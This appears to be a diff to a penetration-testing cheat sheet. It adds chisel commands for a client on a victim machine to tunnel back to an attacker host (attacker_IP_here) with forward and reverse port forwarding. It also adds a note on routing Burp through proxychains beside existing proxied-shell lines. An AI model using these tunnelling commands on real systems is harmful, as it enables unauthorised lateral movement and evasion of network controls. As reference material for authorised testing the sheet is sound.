@@ -842,6 +842,25 @@ checksec file_name_here
 
 
 
+## CHISEL
+```bash
+# set up server
+chisel server -p listener_port_here
+
+# set up server + allow clients to open listening port on server
+chisel server -p listener_port_here --reverse
+
+# transfer chisel to victim
+
+# connect back to attacker box as client (forward_port required)
+chisel client attacker_IP_here:listener_port_here listener_host-here:listener_port_here:target_forward_host_here:target_forward_port_here
+
+# connect back to attacker box as client (open up listening port on server)
+chisel client attacker_IP_here:listener_port_here R:listener_port_here:target_forward_host_here:target_forward_port_here
+```
+
+
+
 ## CMD
 ```powershell
 # display arp entries
@@ -3078,6 +3097,9 @@ socks5 127.0.0.1 port_here
 # spawn proxied shell
 PROXYCHAINS_SOCKS5=port_here proxychains bash
 PROXYCHAINS_SOCKS5=port_here proxychains4 bash
+
+# burp over proxychains
+Burp > User options > SOCKS proxy
 ```
 
 
